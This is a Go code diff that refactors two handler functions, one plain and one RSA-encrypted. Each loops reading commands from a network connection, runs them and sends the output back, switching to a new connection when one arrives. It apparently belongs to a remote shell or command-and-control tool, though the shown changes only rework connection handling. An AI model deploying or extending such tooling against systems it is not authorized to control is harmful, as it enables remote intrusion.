@@ -7,9 +7,8 @@ import (
 	"time"
 )
 
-func Handler(conn net.Conn, OS_info string, conn_update <-chan *net.Conn) {
-	// Declare updated_conn variable outside the loop
-	var updated_conn net.Conn = conn
+func Handler(conn *net.Conn, OS_info string, conn_update <-chan *net.Conn) {
+	defer (*conn).Close() // Defer close the most recent connection
 
 	// Infinite loop to handle receiving and executing commands
 	for {
@@ -17,7 +16,7 @@ func Handler(conn net.Conn, OS_info string, conn_update <-chan *net.Conn) {
 		select {
 		case updated, ok := <-conn_update:
 			if ok {
-				updated_conn = *updated
+				*conn = *updated
 			}
 		default:
 			// Do nothing if there's no connection update
@@ -27,7 +26,7 @@ func Handler(conn net.Conn, OS_info string, conn_update <-chan *net.Conn) {
 		var buf []byte = make([]byte, 1024)
 
 		// Read command from the client
-		n, err := updated_conn.Read(buf)
+		n, err := (*conn).Read(buf)
 		if err != nil {
 			time.Sleep(1 * time.Second) // Prevent high CPU usage
 			continue
@@ -46,7 +45,7 @@ func Handler(conn net.Conn, OS_info string, conn_update <-chan *net.Conn) {
 		if len(formatted_output) == 0 {
 			formatted_output = "Empty output"
 		}
-		_, err = updated_conn.Write([]byte(formatted_output))
+		_, err = (*conn).Write([]byte(formatted_output))
 
 		// Incase connection issues occur just before the response is sent
 		if err != nil {
@@ -55,9 +54,9 @@ func Handler(conn net.Conn, OS_info string, conn_update <-chan *net.Conn) {
 			case updated, ok := <-conn_update:
 
 				if ok {
-					updated_conn = *updated
+					*conn = *updated
 					// Send response, if another error occurs move onto next iteration
-					_, err = updated_conn.Write([]byte(formatted_output))
+					_, err = (*conn).Write([]byte(formatted_output))
 					if err != nil { // Do nothing if another error occurs
 						continue
 					}
@@ -71,9 +70,8 @@ func Handler(conn net.Conn, OS_info string, conn_update <-chan *net.Conn) {
 	}
 }
 
-func Handler_RSA(conn net.Conn, OS_info string, private_key string, public_key string, conn_update <-chan *net.Conn) {
-	// Declare updated_conn variable outside the loop
-	var updated_conn net.Conn = conn
+func Handler_RSA(conn *net.Conn, OS_info string, private_key string, public_key string, conn_update <-chan *net.Conn) {
+	defer (*conn).Close() // Defer close the most recent connection
 
 	// Infinite loop to handle receiving and executing commands
 	for {
@@ -81,7 +79,7 @@ func Handler_RSA(conn net.Conn, OS_info string, private_key string, public_key s
 		select {
 		case updated, ok := <-conn_update:
 			if ok {
-				updated_conn = *updated
+				*conn = *updated
 			}
 		default:
 			// Do nothing if there's no connection update
@@ -91,7 +89,7 @@ func Handler_RSA(conn net.Conn, OS_info string, private_key string, public_key s
 		var buf []byte = make([]byte, 1024)
 
 		// Read command from the client
-		n, err := updated_conn.Read(buf)
+		n, err := (*conn).Read(buf)
 		if err != nil {
 			continue
 		}
@@ -122,7 +120,7 @@ func Handler_RSA(conn net.Conn, OS_info string, private_key string, public_key s
 			fmt.Println("Error encrypting output:", err)
 			continue
 		}
-		_, err = updated_conn.Write([]byte(encrypted_output))
+		_, err = (*conn).Write([]byte(encrypted_output))
 
 		// Incase connection issues occur just before the response is sent
 		if err != nil {
@@ -131,9 +129,9 @@ func Handler_RSA(conn net.Conn, OS_info string, private_key string, public_key s
 			case updated, ok := <-conn_update:
 
 				if ok {
-					updated_conn = *updated
+					*conn = *updated
 					// Send response, if another error occurs move onto next iteration
-					_, err = updated_conn.Write([]byte(encrypted_output))
+					_, err = (*conn).Write([]byte(encrypted_output))
 					if err != nil { // Do nothing if another error occurs
 						continue
 					}
